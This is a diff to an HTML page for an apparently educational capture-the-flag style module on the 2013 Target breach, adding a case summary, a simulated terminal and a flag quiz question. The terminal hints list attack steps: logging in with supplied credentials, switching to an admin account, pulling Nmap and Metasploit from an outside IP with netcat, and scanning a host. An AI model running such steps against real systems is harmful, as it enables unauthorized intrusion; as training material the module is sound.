@@ -45,36 +45,61 @@
                             </div>
                             <div class="spacer" style="height: 1em;"></div>
                             <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
-                                Target Overview:</a>
+                                Target Overview:
                             </div>
-                        </div>
-                        <div class="moduleSection">
-                            <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
-                                TBD
                             </div>
-                        </div>
-                        <div class="spacer" style="height: 1em;"></div>
-                        <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
-                            Vulnerability Details:</a>
-                        </div>
-                        <div class="moduleSection">
-                            <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
-                                TBD
+                            <div class="moduleSection">
+                                <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
+                                    In 2013, during the peak holiday shopping season, Target, one of the largest retail chains in the United States, fell victim to a massive cyber attack. Hackers gained unauthorized access to Target's internal systems, compromising detailed information for approximately 40 million credit and debit card accounts and personal data for about 70 million customers. Despite Target's substantial investment in cybersecurity, including sophisticated malware detection software and a large security team, the breach occurred due to a phishing attack on a third-party vendor, Fazio Mechanical. The hackers exploited this breach to steal login credentials for Target's system and deploy malware, resulting in catastrophic financial losses and significant damage to Target's reputation.
+                                </div>
                             </div>
-                        </div>
-                        <div class="spacer" style="height: 1em;"></div>
-                            <button class="returnButton"><a href="/src/home/html/index.html">Return to Main Page</a></button>
+                            <div class="spacer" style="height: 1em;"></div>
+                            <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
+                                Vulnerability Details:
+                            </div>
+                            <div class="moduleSection">
+                                <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
+                                    The vulnerability exploited in the Target breach stemmed from a phishing attack on a third-party vendor, Fazio Mechanical. An employee of Fazio fell for a fraudulent email containing a malicious attachment, which enabled the hackers to deploy the Citadel Trojan horse—a variant of the well-known ZeuS malware. Despite Target's security measures, including the use of sophisticated malware detection software, the malware remained undetected on Fazio's systems. Subsequently, the hackers obtained login credentials for Target's network and deployed additional malware, which went unnoticed even after multiple alerts were issued by the malware detection system. This failure to respond to security alerts and disable automated malware deletion features allowed the hackers to exfiltrate sensitive data over a two-week period, leading to substantial financial losses and reputational damage for Target.
+                                </div>
+                            </div>
+                            <div class="spacer" style="height: 1em;"></div>
+                        <button class="returnButton"><a href="/src/home/html/index.html">Return to Main Page</a></button>                            
                     </div>
                   </div>
                 </div>
               </div>
-              <!-- Terminal -->
-              <div class="resizableContainer" id="terminalContainer">
-                <h2>Remote Terminal</h2>
-                <div id="terminalDescription" style="font-size: 16px; font-weight: normal; color: white;">TBD</div>
-                <div id="terminal"></div>
-            </div>
-            </div>
+<!-- Terminal -->
+<div class="resizableContainer" id="terminalContainer">
+    <h2>Remote Terminal</h2>
+    <div id="terminalDescription" style="font-size: 16px; font-weight: normal; color: white;">Welcome to the aftermath investigation of a cyber attack on a prominent retail chain. Assume the role of a cybersecurity analyst tasked with investigating the breach and identifying the vulnerabilities exploited by the attackers.
+
+In this scenario, assume that you already know the credentials of the user that was affected by the phishing attack. The credentials are as follows:
+<ul>
+<li>Username: faziodavid
+<li>Password: 1aB3cD7e
+</ul>
+Follow these hints:
+<ul>
+<li>Use the <code style="color: rgb(255, 215, 0);">help-module2</code> command to explore available commands.</li>
+<li>Begin by logging into the Ariba website using the obtained credentials: <code style="color: rgb(255, 215, 0);">ssh 192.168.1.47</code>.</li>
+<li>Escalate privileges by switching to the default user on the BMC server: <code style="color: rgb(255, 215, 0);">su - bmcadmin</code>.</li>
+<li>Download essential hacking tools, such as Nmap and Metasploit, using raw netcat commands:
+<ul>
+<li><code style="color: rgb(255, 215, 0);">nc 74.233.19.204 12345 > nmap.tar.gz</code></li>
+<li><code style="color: rgb(255, 215, 0);">nc 74.233.19.204 12345 > metasploit.tar.gz</code></li>
+</ul><li>Unzip and install the downloaded tools in your current directory:
+<ul>
+<li><code style="color: rgb(255, 215, 0);">tar -xzf nmap.tar.gz</code></li>
+<li><code style="color: rgb(255, 215, 0);">tar -xzf metasploit.tar.gz</code></li>
+</ul><li>Initiate internal reconnaissance by running Nmap to scan the network: <code style="color: rgb(255, 215, 0);">nmap 192.168.1.47</code>.</li>
+<li>Conduct a more in-depth scan of specific network services to identify vulnerabilities: <code style="color: rgb(255, 215, 0);">nmap -sV -p 135 192.168.1.47</code>.</li>
+</ul>Learn more about cybersecurity investigation techniques and tools:
+<ul>
+<li><a href="https://www.sans.org/cyber-security-skills-roadmap" style="color: rgb(255, 215, 0);">Cyber Security Skills Roadmap</a></li>
+<li><a href="https://www.forensicscolleges.com/blog/resources/what-is-digital-forensics/" style="color: rgb(255, 215, 0);">Digital Forensics Overview</a></li>
+<li><a href="https://www.nist.gov/" style="color: rgb(255, 215, 0);">NIST Cybersecurity Framework</a></li></ul></div>
+    <div id="terminal"></div>                
+</div>
             <!-- Questions -->
             <div class="resizableContainer" id="questionFormContainer">
                 <form class="containerContent" id="questionForm">
@@ -192,6 +217,25 @@
                             <div>
                                 <input type="radio" id="Q6d" name="singleChoiceAnswer6" value="Ignore security updates on Target's systems" style="display: none;">
                                 <label class="radio-label" for="Q6d">Ignore security updates on Target's systems</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">What is the hidden flag after exploiting the vulnerable machine?</label>
+                            <div>
+                                <input type="radio" id="Q7a" name="singleChoiceAnswer6" value="35FW5x" style="display: none;">
+                                <label class="radio-label" for="Q7a">GDxHwD</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7b" name="singleChoiceAnswer6" value="208cE7" style="display: none;">
+                                <label class="radio-label" for="Q7b">HivRzt</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7c" name="singleChoiceAnswer6" value="0T801j" style="display: none;">
+                                <label class="radio-label" for="Q7c">hXSYNU</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7d" name="singleChoiceAnswer6" value="u46U0o" style="display: none;">
+                                <label class="radio-label" for="Q7d">rECkLs</label>
                             </div>
                         </div>
                     </div>
